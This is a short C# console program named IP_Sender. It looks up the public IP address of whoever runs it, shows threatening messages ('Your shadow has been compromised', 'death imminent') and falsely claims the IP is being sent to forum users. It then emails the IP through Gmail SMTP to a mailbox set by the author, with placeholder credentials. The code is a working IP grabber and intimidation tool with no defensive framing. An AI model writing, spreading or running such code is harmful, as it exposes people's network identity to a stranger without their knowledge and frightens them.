using System;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Threading;

namespace IP_Sender
{
    class Program
    {
    static void Main(string[] args)
        {
            var webClient = new WebClient();
            var ip = webClient.DownloadString("https://api.my-ip.io/ip");
            Console.WriteLine($"Your IP Address is: {ip}");
            Console.WriteLine("Sending IP to multiple users on Nanochan Forum...");
            Thread.Sleep(3000);
            Console.WriteLine("Your shadow has been compromised");
            Console.WriteLine("Have fun while you can");

            SmtpClient client = new SmtpClient("smtp.gmail.com", 587);
            client.EnableSsl = true;
            client.Timeout = 10000;
            client.DeliveryMethod = SmtpDeliveryMethod.Network;
            client.UseDefaultCredentials = false;
            client.Credentials = new NetworkCredential("adresa ta@gmail.com", "parola ta");
            MailMessage msg = new MailMessage();
            msg.To.Add("adresa ta@gmail.com");
            msg.From = new MailAddress("adresa ta@gmail.com");
            msg.Subject = "IP Address found";
            msg.Body = $"{ip}";
            client.Send(msg);

            handler = new ConsoleEventDelegate(ConsoleEventCallback);
            SetConsoleCtrlHandler(handler, true);
            Console.ReadLine();
        }
        static bool ConsoleEventCallback(int eventType)
        {
            if (eventType == 2)
            {
                Console.WriteLine("Console window closing, death imminent");
            }
            return false;
        }
        static ConsoleEventDelegate handler;   // Keeps it from getting garbage collected
                                               // Pinvoke
        private delegate bool ConsoleEventDelegate(int eventType);
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool SetConsoleCtrlHandler(ConsoleEventDelegate callback, bool add);

    }
}
